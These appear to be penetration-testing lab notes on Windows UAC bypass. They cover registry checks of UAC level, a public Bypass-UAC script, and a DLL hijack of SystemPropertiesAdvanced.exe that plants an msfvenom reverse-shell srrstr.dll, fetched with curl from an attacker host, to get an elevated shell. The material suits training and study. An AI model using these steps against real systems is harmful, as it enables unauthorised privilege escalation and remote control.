
## Table of Contents:

- [[#UACME]]
- [[#UAC enumeration]]
- [[#Bypassing UAC Scripts]]
- [[#Example - Windows 10 build 14393]]

---

## UACME

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses. This all is for when we only have cmd access and no GUI to `Run as administrator`. 

---

## UAC enumeration

No `evil-winrm` escape (That only works when you add an account to a group).

```PowerShell
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
### Confirming if UAC is enabled 

C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
### Checking UAC Level

PS C:\htb> [environment]::OSVersion.Version
### Checking Windows build
```

The value of `ConsentPromptBehaviorAdmin`: `0x5`, means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.
UAC bypasses leverage flaws or unintended functionality in different Windows builds. We can use [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page to cross-reference Windows release to its build.

---

## Bypassing UAC Scripts

[UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts.

```PowerShell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

---

## Example - Windows 10 build 14393

### Enumeration

According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL `srrstr.dll` used by System Restore functionality.

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

```PowerShell
PS C:\htb> cmd /c echo %PATH%
### Reviewing Path Variables
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

### Exploitation

```sh
> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

```PowerShell
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
### Instlling malicious DLL from our machine

C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
### Running this DLL directly will give normal rights (UAC Enabled)

C:\htb> tasklist /svc | findstr "rundll32"
C:\htb> taskkill /PID 7044 /F
### Finding and killing all the instances of rundll32 we created earlier

C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
### running the vulnerable .exe file and recieving the elevated connection back
```

---